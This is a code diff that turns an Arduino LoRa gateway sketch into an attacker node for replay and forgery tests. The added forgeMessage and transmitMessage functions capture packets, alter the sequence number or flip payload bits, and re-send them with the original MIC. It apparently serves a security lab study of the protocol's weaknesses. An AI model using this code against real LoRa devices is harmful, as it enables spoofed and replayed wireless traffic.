@@ -25,9 +25,17 @@
 //////////////////////////////////////////////
 // Variables
 
-byte seqNum = 0;              // sequence number of outgoing messages
-byte localAddress = 0xAF;     // address of the gateway
-byte destination = 0xBB;      // destination of the end device
+bool replayAttack = false;
+bool forgeryAttack = true;
+int forgeryAttackType = 3;
+
+uint8_t header_b1;
+uint8_t header_b2;
+uint8_t header_b3;
+uint16_t deviceAddress;
+uint16_t sequenceNum;
+uint16_t payload;
+uint8_t mic[4];
 
 struct EndDevice {
   uint16_t id;
@@ -46,11 +54,11 @@ struct EndDevice devices[5] = {};
 uint32_t getMsgKey(uint8_t initVector[], uint8_t secretKey[]) {
 
   uint8_t plaintext[4];
-  uint32_t plaintextword[0];
+  uint32_t plaintextword[1];
   uint8_t ciphertext[4];
-  uint32_t ciphertextword[0];
+  uint32_t ciphertextword[1];
 
-  uint32_t secretkeyword[0];
+  uint32_t secretkeyword[2];
   uint32_t roundkey[22];
 
   ConvertBW32(initVector, plaintextword, 4);                 // input: uint8 array of length 4 // output: uint32 array of length 1
@@ -65,11 +73,10 @@ uint32_t getMsgKey(uint8_t initVector[], uint8_t secretKey[]) {
   return msgKey;
 }
 
-void deriveSecretKey(uint8_t nonce[], int device_num) {
-
+void deriveSecretKey(uint8_t * nonce, int device_num) {
   uint32_t nonceword[2];
   uint8_t ciphertext[8];
-  uint32_t ciphertextword[4];
+  uint32_t ciphertextword[2];
 
   uint32_t rootKeyWord[4];
   uint32_t roundkey[27];
@@ -78,18 +85,12 @@ void deriveSecretKey(uint8_t nonce[], int device_num) {
   ConvertBW32(devices[device_num].rootkey, rootKeyWord, 16);
   Expand128(rootKeyWord, roundkey);
   Block64Encrypt(nonceword, ciphertextword, roundkey);
-  ConvertW32B(ciphertextword, ciphertext, 8);
-
-  /*  uint32_t sKey = ((uint32_t)ciphertext[0] << 56) | ((uint32_t)ciphertext[1] << 48) |
-                    ((uint32_t)ciphertext[2] << 40) | ((uint32_t)ciphertext[3] << 32) |
-                    ((uint32_t)ciphertext[4] << 24) | ((uint32_t)ciphertext[5] << 16) |
-                    ((uint32_t)ciphertext[6] << 8) | (uint32_t)ciphertext[7];
-    Serial.print("Secret key derived: ");
-    Serial.println(sKey); */
+  ConvertW32B(ciphertextword, ciphertext, 2);
 
   for (int i = 0; i < 8; i++) {
     devices[device_num].secretkey[i] = ciphertext[i];
   }
+  devices[device_num].activated = true;
 }
 
 
@@ -101,8 +102,14 @@ uint32_t checkMIC(uint16_t dev_addr, uint16_t seq_num, uint16_t payload, uint8_t
 }
 
 
-uint8_t blakePlaceholder(uint16_t payload) {
-  uint8_t hashedNonce[8] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, (uint8_t)(payload >> 8), (uint8_t)payload};
+uint8_t * blakePlaceholder(uint16_t payload) {
+  static uint8_t hashedNonce[8] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, (uint8_t)(payload >> 8), (uint8_t)payload};
+  /*Serial.print("blakePlaceholder hashedNonce ");
+    for (int i = 0; i < 8; i++) {
+    Serial.print(hashedNonce[i]);
+    Serial.print(" ");
+    }
+    Serial.println();*/
   return hashedNonce;
 }
 
@@ -141,7 +148,7 @@ void ConvertW32B(uint32_t words[], uint8_t bytes[], int wordcount) {
 /*************** Key Schedule ***************/
 
 void Expand64(uint32_t K[], uint32_t roundkey[]) {
-  uint32_t i, D = K[3], C = K[2], B = K[1], A = K[0];
+  static uint32_t i, D = K[3], C = K[2], B = K[1], A = K[0];
   for (i = 0; i < 22;) {
     roundkey[i] = A;
     EncryptRound32(B, A, i++);
@@ -153,7 +160,7 @@ void Expand64(uint32_t K[], uint32_t roundkey[]) {
 }
 
 void Expand128(uint32_t K[], uint32_t roundkey[]) {
-  uint32_t i, D = K[3], C = K[2], B = K[1], A = K[0];
+  static uint32_t i, D = K[3], C = K[2], B = K[1], A = K[0];
   for (i = 0; i < 27;) {
     roundkey[i] = A;
     EncryptRound32(B, A, i++);
@@ -189,7 +196,7 @@ void Block64Encrypt(uint32_t plaintext[], uint32_t ciphertext[], uint32_t roundk
 /////////////////////////////////////////////
 // Setup environment
 void setup() {
-  Serial.begin(9600);
+  Serial.begin(115200);
 
   while (!Serial);
   Serial.println("LoRa Receiver");
@@ -205,15 +212,6 @@ void setup() {
   // Enable CRC
   LoRa.enableCrc();
   LoRa.disableInvertIQ();
-  EndDevice ed01 = {
-    0x2b8,
-    {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f},
-    {0x00},
-    0x00,
-    false,
-  };
-
-  devices[0] = ed01;
 }
 
 /////////////////////////////////////////////
@@ -228,77 +226,138 @@ void loop() {
 
 void onReceive(int packetSize) {
   if (packetSize == 0) return;          // if there's no packet, return
-
-  uint16_t deviceAddress;
-  uint16_t sequenceNum;
-  uint16_t payload;
-  uint32_t mic;
+  //Serial.println("---------------------------------------");
+  //Serial.println("Packet arrived");
+  payload = 0;
 
   for (int i = 0; i < packetSize; i++) {
     if (i == 0) {
-      deviceAddress = (uint16_t)(LoRa.read() << 4);
+      uint16_t tmp = (uint16_t)LoRa.read();
+      deviceAddress = tmp << 4;
+      header_b1 = (uint8_t)tmp;
     }
     else if (i == 1) {
       uint16_t tmp = (uint16_t)LoRa.read();
-      deviceAddress = deviceAddress or (tmp >> 4);
-      sequenceNum = tmp << 8;
+      deviceAddress = deviceAddress | (tmp >> 4);
+      sequenceNum = (tmp & (uint16_t)15) << 8;
+      header_b2 = (uint8_t)tmp;
     }
     else if (i == 2) {
-      sequenceNum = sequenceNum or (uint16_t)(LoRa.read());
+      uint16_t tmp = (uint16_t)LoRa.read();
+      sequenceNum = sequenceNum | tmp;
+      header_b3 = (uint8_t)tmp;
     }
     else if (i < 5) {
-      payload = payload or (uint16_t)(LoRa.read() << 8 * (4 - i));
+      uint16_t tmp = (uint16_t)LoRa.read();
+      payload = payload | (tmp << 8 * (4 - i));
     }
     else {
-      mic = mic or (uint32_t)(LoRa.read() << 8 * (8 - i));
+      uint8_t tmp = LoRa.read();
+      mic[i - 5] = tmp;
     }
   }
 
-
-  int x;
-  if (devices[0].id != 0) {
-    for (x = 0; x < 5; x++) {
-      if (devices[x].id == deviceAddress) {
-        uint8_t key[16];
-        Serial.print("Succes\n");
-        if (devices[x].activated == true) {
-          Serial.print("This is a payload\n");
-          for (int y = 0; y < 8; y++) {
-            key[y] = devices[x].secretkey[y];
-          }
-        } else {
-          Serial.print("This is a nonce\n");
-          for (int y = 0; y < 16; y++) {
-            key[y] = devices[x].rootkey[y];
-          }
-        }
-
-        if (devices[x].seqNum >= sequenceNum) {
-          Serial.print("Dropping packet: Inconsistent seq_num\n");
-          return;
-        }
-        if (checkMIC(deviceAddress, sequenceNum, payload, key) != mic) {
-          Serial.print("Dropping packet: Incosistent mic\n");
-          return;
-        }
-
-        devices[x].seqNum = sequenceNum;
-        if (key == devices[x].secretkey) {
-          // Decrypt
-          uint8_t IV[4];
-          getAddressSequence(IV, deviceAddress, sequenceNum);
-          uint32_t msgKey = getMsgKey(IV, key);
-          uint16_t text = payload ^ (uint16_t)msgKey;
-          Serial.println("Received message: " + text);
-        } else if (key == devices[x].rootkey) {
-          // Generate secret key
-          deriveSecretKey(payload, x);
-        } else {
-          Serial.print("WTF, should not be happening!!!\n");
-        }
-
-      }
-    }
+  Serial.println("------------ Packet recived ------------");
+  Serial.print("Device address:   ");
+  Serial.print(deviceAddress);
+  Serial.println("\t\t\t|\t12 bits");
+  Serial.print("Sequence number:  ");
+  Serial.print(sequenceNum);
+  Serial.println("\t\t\t|\t12 bits");
+  Serial.print("Ciphertext:       ");
+  Serial.print(payload);
+  Serial.print("\t\t\t|\t");
+  Serial.print(sizeof(payload));
+  Serial.println(" bytes");
+  Serial.print("MIC:              ");
+  for (int i = 0; i < 4; i++) {
+    Serial.print(mic[i]);
   }
+  Serial.print("\t\t|\t");
+  Serial.print(sizeof(mic));
+  Serial.println(" bytes");
+  /*Serial.print("Secret key:       ");
+  Serial.print("N/A");
+  Serial.println("\t\t\t|");*/
+  Serial.println("----------------------------------------");
+
+  if (replayAttack && sequenceNum > 1) {
+    delay(500);
+    Serial.println("----------- Replaying packet -----------");
+    transmitMessage();
+  }
+  else if (forgeryAttack && sequenceNum > 1) {
+    delay(500);
+    forgeMessage(forgeryAttackType, sequenceNum, payload);        // param: 1 = sequence number, 2 = payload, 3 = both
+  }
+
+}
+
+void forgeMessage(uint16_t field, uint16_t seqNum, uint16_t pay) {
+
+  if (field == 1) {                             // if forge sequence number
+    Serial.println("-------- Forging sequence number --------");
+    uint16_t forgedSeqNum = seqNum + 2;
+    sequenceNum = forgedSeqNum;
+    header_b2 &= 240;
+    header_b2 ^= forgedSeqNum >> 8;
+    header_b3 = forgedSeqNum;
+  }
+  else if (field == 2) {                        // if forge payload
+    Serial.println("------------ Forging payload ------------");
+    uint16_t forgedPayload = pay ^ 170;
+    payload = forgedPayload;
+  }
+  else if (field == 3) {                        // if forge both
+    Serial.println("-- Forging sequence number and payload --");
+    uint16_t forgedSeqNum = seqNum + 2;
+    sequenceNum = forgedSeqNum;
+    header_b2 &= 240;
+    header_b2 ^= forgedSeqNum >> 8;
+    header_b3 = forgedSeqNum;
+
+    uint16_t forgedPayload = pay ^ 170;
+    payload = forgedPayload;
+  }
+  transmitMessage();
+}
+
+void transmitMessage() {
+
+  uint8_t payload_b1 = payload >> 8;
+  uint8_t payload_b2 = payload;
+
+  Serial.print("Device address:   ");
+  Serial.print(deviceAddress);
+  Serial.println("\t\t\t|\t12 bits");
+  Serial.print("Sequence number:  ");
+  Serial.print(sequenceNum);
+  Serial.println("\t\t\t|\t12 bits");
+  Serial.print("Ciphertext:       ");
+  Serial.print(payload);
+  Serial.print("\t\t\t|\t");
+  Serial.print(sizeof(payload));
+  Serial.println(" bytes");
+  Serial.print("MIC:              ");
+  for (int i = 0; i < 4; i++) {
+    Serial.print(mic[i]);
+  }
+  Serial.print("\t\t|\t");
+  Serial.print(sizeof(mic));
+  Serial.println(" bytes");
+  Serial.println("----------------------------------------");
+  Serial.println();
+
+  LoRa.beginPacket();              // beginPacket(implicitHeader = 1)
+  LoRa.write(header_b1);
+  LoRa.write(header_b2);
+  LoRa.write(header_b3);
+  LoRa.write(payload_b1);
+  LoRa.write(payload_b2);
+  LoRa.write(mic[0]);
+  LoRa.write(mic[1]);
+  LoRa.write(mic[2]);
+  LoRa.write(mic[3]);
+  LoRa.endPacket(true);             // endPacket(true)  // true = non-blocking mode
 
 }
